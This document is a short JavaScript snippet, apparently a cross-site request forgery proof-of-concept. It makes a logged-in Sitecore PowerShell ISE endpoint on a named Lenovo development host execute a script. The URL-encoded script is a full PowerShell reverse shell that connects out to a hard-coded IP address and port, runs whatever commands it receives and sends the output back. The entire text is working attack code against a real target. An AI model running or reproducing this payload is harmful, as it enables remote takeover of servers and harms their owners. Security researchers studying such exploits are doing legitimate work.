
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/cm.dxp-dev.lenovo.com\/sitecore\/shell\/Applications\/PowerShell\/PowerShellIse?sc_bw=1&sc_lang=en", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "uk-UA,uk;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRlMGYwN2E2Yi04ZmE3LTRmZGMtOTU5Ni0xMGVlZjQxYmJhYjQL&__VIEWSTATE=980BF9BFA3C94E7AAB3B68957F33E563&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2213.49.154.125%22%2C2465)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%22PS%20%22%20%2B%20(pwd).Path%20%2B%20%22%3E%20%22%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%0A";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
     
